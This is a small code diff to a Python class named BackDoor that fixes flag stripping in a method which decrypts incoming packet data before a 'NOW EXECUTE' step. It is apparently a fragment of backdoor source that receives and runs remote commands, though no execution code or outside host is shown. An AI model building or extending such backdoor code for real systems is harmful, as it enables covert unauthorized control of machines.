@@ -30,7 +30,7 @@ class BackDoor:
 
     def process_packets(self, data: str):
         print("Stripping flags to extract data")
-        stripped_msg = data.strip(self.flag_begin).rstrip(self.flag_end)
+        stripped_msg = data.strip(self.flag_begin).rstrip(self.flag_close)
         decrypted_msg = self.decrypt_data(stripped_msg)
         print("NOW EXECUTE")
 
